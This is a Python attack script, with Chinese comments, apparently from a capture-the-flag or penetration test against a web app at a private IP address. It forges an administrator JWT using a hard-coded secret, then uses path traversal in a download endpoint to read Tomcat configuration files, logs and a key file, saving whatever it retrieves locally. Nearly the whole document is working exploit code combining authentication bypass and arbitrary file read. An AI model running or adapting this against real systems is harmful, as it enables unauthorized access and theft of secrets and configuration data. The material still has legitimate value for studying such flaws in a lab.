#!/usr/bin/env python3
"""
通过Java系统属性探测路径信息
"""

import requests
import jwt
from datetime import datetime, timedelta, timezone

BASE_URL = "http://192.168.18.25:25004"
JWT_SECRET = "secret-secret-secret-secret-secret-secret-secret-secret-secret-secret-secret"

def create_admin_session():
    payload = {
        "sub": "admin",
        "exp": datetime.now(timezone.utc) + timedelta(minutes=30)
    }
    token = jwt.encode(payload, JWT_SECRET, algorithm="HS512")
    session = requests.Session()
    session.cookies.set("jwt", token)
    return session

def read_file(session, path):
    encoded_path = path.replace('/', '%2f')
    url = f"{BASE_URL}/download?path=uploads%2f..%2f{encoded_path}"
    r = session.get(url)
    if r.status_code == 200:
        return r.text
    return None

def main():
    session = create_admin_session()
    
    print("尝试读取可能的路径信息文件...")
    print()
    
    # 根据BackUpServlet，应用根目录的父目录有ﾎﾝ.key
    # 让我们尝试猜测可能的Tomcat路径结构
    
    # Tomcat常见路径:
    # /usr/local/tomcat/webapps/ROOT/
    # /opt/tomcat/webapps/ROOT/
    # /var/lib/tomcat/webapps/ROOT/
    
    # 尝试读取Tomcat配置文件
    tomcat_paths = [
        "../../conf/server.xml",          # Tomcat配置
        "../../conf/web.xml",              # 全局web.xml
        "../../conf/context.xml",          # Context配置
        "../../../conf/server.xml",        # 更上层
        "../../../../conf/server.xml",     # 再上层
        "../../logs/catalina.out",         # 日志文件
        "../ﾎﾝ.key",                        # key文件
        "../../ﾎﾝ.key",                     # 上一层的key
    ]
    
    for path in tomcat_paths:
        print(f"[*] {path}")
        content = read_file(session, path)
        
        if content:
            print(f"[+] 成功! 大小: {len(content)} bytes")
            print(f"前100字符: {content[:100]}")
            
            # 保存
            safe_name = path.replace('/', '_').replace('..', 'up')
            with open(f"found_{safe_name}", 'w', encoding='utf-8', errors='ignore') as f:
                f.write(content)
            print(f"[+] 已保存")
        print()

if __name__ == "__main__":
    main()
